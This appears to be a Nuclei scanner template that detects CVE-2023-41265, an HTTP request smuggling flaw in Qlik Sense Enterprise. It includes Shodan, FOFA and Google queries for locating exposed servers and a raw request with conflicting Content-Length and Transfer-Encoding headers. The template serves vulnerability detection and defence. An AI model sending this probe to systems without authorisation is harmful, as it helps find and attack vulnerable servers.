id: CVE-2023-41265

info:
  name: Qlik Sense Enterprise - HTTP Request Smuggling
  author: AdamCrosser
  severity: critical
  description: |
    An HTTP Request Tunneling vulnerability found in Qlik Sense Enterprise for Windows for versions May 2023 Patch 3 and earlier, February 2023 Patch 7 and earlier, November 2022 Patch 10 and earlier, and August 2022 Patch 12 and earlier allows a remote attacker to elevate their privilege by tunneling HTTP requests in the raw HTTP request. This allows them to send requests that get executed by the backend server hosting the repository application. This is fixed in August 2023 IR, May 2023 Patch 4, February 2023 Patch 8, November 2022 Patch 11, and August 2022 Patch 13.
  reference:
    - https://www.praetorian.com/blog/doubleqlik-bypassing-the-original-fix-for-cve-2023-41265/
    - https://www.praetorian.com/blog/qlik-sense-technical-exploit
    - https://www.praetorian.com/blog/advisory-qlik-sense/
    - https://community.qlik.com/t5/Release-Notes/tkb-p/ReleaseNotes
    - https://community.qlik.com/t5/Official-Support-Articles/Critical-Security-fixes-for-Qlik-Sense-Enterprise-for-Windows/ta-p/2110801
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.9
    cve-id: CVE-2023-41265
    cwe-id: CWE-444
    epss-score: 0.91412
    epss-percentile: 0.98873
    cpe: cpe:2.3:a:qlik:qlik_sense:august_2022:-:*:*:enterprise:windows:*:*
  metadata:
    max-request: 1
    vendor: qlik
    product: qlik_sense
    framework: windows
    shodan-query:
      - html:"Qlik"
      - http.favicon.hash:-74348711
      - http.html:"qlik"
      - http.title:"qlik-sense"
    fofa-query:
      - app="qlik-sense"
      - title="qlik-sense"
      - icon_hash=-74348711
      - body="qlik"
    google-query: intitle:"qlik-sense"
  tags: cve2023,cve,kev,qlik,smuggling,windows

http:
  - raw:
      - |+
        GET /resources/qmc/fonts/CVE-2023-41265.ttf HTTP/1.1
        Host: {{Hostname}}
        Cookie: X-Qlik-Session=13333333-3333-3333-3333-333333333337
        Content-Type: text/html
        Content-Length: 5
        Transfer-Encoding: chunked

        ;

    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - status_code == 400
          - contains(to_lower(set_cookie), 'x-qlik-session')
          - contains(header, 'Bad Request')
        condition: and
# digest: 4a0a00473045022100985c76cbc6b1a7ec3c523cfb5a91299f46e8756056b877e7ab0b8db7c12ee45902202d45b808dc9e642c3785964d3a448190ae63d84513be96641be3ff6e435c5764:922c64590222798bb761d5b6d8e72950